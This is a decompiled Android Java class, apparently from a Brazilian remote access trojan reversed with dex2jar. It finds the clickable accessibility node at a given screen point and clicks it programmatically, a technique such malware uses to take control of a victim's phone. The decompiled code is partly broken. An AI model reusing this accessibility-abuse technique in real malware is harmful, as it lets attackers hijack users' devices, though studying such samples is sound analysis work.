package com.irifix;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.Iterator;
import java.util.List;

public class d {
  private static int a = 1;
  
  private static AccessibilityNodeInfo a(int paramInt1, int paramInt2, AccessibilityNodeInfo paramAccessibilityNodeInfo, int paramInt3) {
    AccessibilityNodeInfo accessibilityNodeInfo;
    List<AccessibilityNodeInfo> list = null;
    List list1 = null;
    if (paramAccessibilityNodeInfo != null) {
      List<AccessibilityNodeInfo> list2 = a.a(paramAccessibilityNodeInfo);
      if (!a.a(list2))
        return null; 
      Iterator<AccessibilityNodeInfo> iterator = list2.iterator();
      list2 = list1;
      while (true) {
        list = list2;
        if (iterator.hasNext()) {
          accessibilityNodeInfo = iterator.next();
          list1 = accessibilityNodeInfo.getActionList();
          if (list1 == null || list1.isEmpty())
            continue; 
          Rect rect = new Rect();
          accessibilityNodeInfo.getBoundsInScreen(rect);
          if (rect.contains(paramInt1, paramInt2) && paramInt3 == a && list1.contains(AccessibilityNodeInfo.AccessibilityAction.ACTION_CLICK))
            AccessibilityNodeInfo accessibilityNodeInfo1 = accessibilityNodeInfo; 
          continue;
        } 
        break;
      } 
    } 
    return accessibilityNodeInfo;
  }
  
  public static boolean a(AccessibilityNodeInfo paramAccessibilityNodeInfo) {
    if (paramAccessibilityNodeInfo != null) {
      Rect rect = new Rect();
      paramAccessibilityNodeInfo.getBoundsInScreen(rect);
      if (!rect.isEmpty()) {
        AccessibilityNodeInfo accessibilityNodeInfo;
        int i = rect.left;
        int j = rect.top;
        rect = null;
        if (paramAccessibilityNodeInfo.getWindow() != null)
          accessibilityNodeInfo = paramAccessibilityNodeInfo.getWindow().getRoot(); 
        if (accessibilityNodeInfo != null) {
          paramAccessibilityNodeInfo = a(i, j, accessibilityNodeInfo, a);
          if (paramAccessibilityNodeInfo != null)
            return paramAccessibilityNodeInfo.performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_CLICK.getId()); 
        } 
      } 
    } 
    return false;
  }
}


/* Location:              /home/fahim/Desktop/BrazilianRat-dex2jar.jar!/com/irifix/d.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */